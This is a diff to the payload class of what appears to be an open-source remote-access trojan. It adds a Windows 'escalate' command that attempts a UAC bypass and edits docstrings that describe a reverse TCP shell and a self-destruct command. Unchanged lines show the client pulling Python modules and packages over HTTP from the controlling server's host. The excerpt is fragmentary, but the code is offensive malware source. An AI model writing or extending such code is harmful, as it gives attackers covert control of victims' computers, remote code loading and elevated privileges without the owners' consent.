@@ -56,6 +56,7 @@ def threaded(function):
 
     `Required`
     :param function:    function/method to add a loading animation
+
     """
     @functools.wraps(function)
     def _threaded(*args, **kwargs):
@@ -173,7 +174,6 @@ class Payload():
             host, port = self.connection.getpeername()
             self._get_resources(target=self.remote['modules'], base_url='http://{}:{}'.format(host, port + 1))
             self._get_resources(target=self.remote['packages'], base_url='http://{}:{}'.format(host, port + 2))
-            print(json.dumps(self.remote, indent=2))
         except Exception as e:
             log(str(e))
 
@@ -448,6 +448,7 @@ class Payload():
         :param str attribute:    payload attribute to show
 
         Returns attribute(s) as a dictionary (JSON) object
+
         """
         try:
             attribute = str(attribute)
@@ -479,7 +480,7 @@ class Payload():
     @config(platforms=['win32','linux2','darwin'], command=True, usage='abort')
     def abort(self, *args):
         """
-        abort execution and self-destruct
+        Abort execution and self-destruct
 
         """
         globals()['_abort'] = True
@@ -711,6 +712,19 @@ class Payload():
                     return self.outlook.usage
             except Exception as e:
                 log("{} error: {}".format(self.email.func_name, str(e)))
+
+    @config(platforms=['win32'], command=True, usage='escalate')
+    def escalate(self):
+        """
+        Attempt UAC bypass to escalate privileges
+
+        """
+        try:
+            if 'escalate' not in globals():
+                self.load('escalate')
+            return globals()['escalate'].run(sys.argv[0])
+        except Exception as e:
+            log("{} error: {}".format(self.escalate.func_name, str(e)))
 
     @config(platforms=['win32','linux2','darwin'], process_list={}, command=True, usage='execute <path> [args]')
     def execute(self, args):
@@ -1018,8 +1032,7 @@ class Payload():
 
     def run(self):
         """
-        Connect back to server via outgoing connection
-        and initialize a reverse TCP shell
+        Initialize a reverse TCP shell
 
         """
         for target in ('resource_handler','prompt_handler','thread_handler'):
